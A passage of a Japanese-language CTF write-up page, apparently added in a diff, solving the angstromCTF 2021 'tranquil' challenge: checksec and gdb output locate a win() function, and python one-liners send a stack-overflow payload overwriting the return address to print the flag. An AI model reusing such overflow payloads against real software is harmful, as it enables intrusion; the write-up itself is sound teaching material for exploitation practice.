+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Logged in! The flag is somewhere else though...&#34;</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Login failed!&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="n">vuln</span><span class="p">();</span>
+    
+    <span class="c1">// not so easy for you!
+</span><span class="c1"></span>    <span class="c1">// win();
+</span><span class="c1"></span>    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution-6">Solution</h3>
+<p>BOFのチャレンジです。</p>
+<p><br /></p>
+<p>checksecより、PIEは無効になっています。</p>
+<pre>
+team7899@actf:~$ checksec /problems/2021/tranquil/tranquil
+[*] '/problems/2021/tranquil/tranquil'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)   <<<
+</pre>
+<p><br />
+win()関数のアドレスは、0x0000000000401196です。</p>
+<pre>
+team7899@actf:~$ gdb /problems/2021/tranquil/tranquil
+:
+:
+(gdb) i func
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401030  puts@plt
+0x0000000000401040  setbuf@plt
+0x0000000000401050  printf@plt
+0x0000000000401060  fgets@plt
+0x0000000000401070  strcmp@plt
+0x0000000000401080  gets@plt
+0x0000000000401090  fopen@plt
+0x00000000004010a0  exit@plt
+0x00000000004010b0  _start
+0x00000000004010e0  _dl_relocate_static_pie
+0x00000000004010f0  deregister_tm_clones
+0x0000000000401120  register_tm_clones
+0x0000000000401160  __do_global_dtors_aux
+0x0000000000401190  frame_dummy
+0x0000000000401196  win   <<<
+</pre>
+<br>
+<p>まずは、バイナリファイルをshell serverから持ってきて、ローカルでテストしました。</p>
+<pre>
+$ (python -c 'print("A"*64+"B"*8+"\x96\x11\x40\x00\x00\x00\x00\x00")' ; cat - ) | ./tranquil
+Enter the secret word: 
+Login failed!
+Missing flag.txt. Contact an admin if you see this on remote.
+</pre>
+<br>
+<p>同じバイナリなのに、shell server上では以下のようにしないとフラグが取れませんでした。理由は知らないです。</p>
+<pre>
+team7899@actf:/problems/2021/tranquil$ (python -c 'print("A"*62+"\x96\x11\x40\x00\x00\x00\x00\x00\x96\x11\x40\x00\x00\x00\x00\x00")' ; cat - ) | ./tranquil
+Enter the secret word:
+Login failed!
+actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
+</pre>
+<br>
+<p>Flag: <code>actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-04-08
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/picoctf_2021/">
+            <span class="next-text nav-default">picoCTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
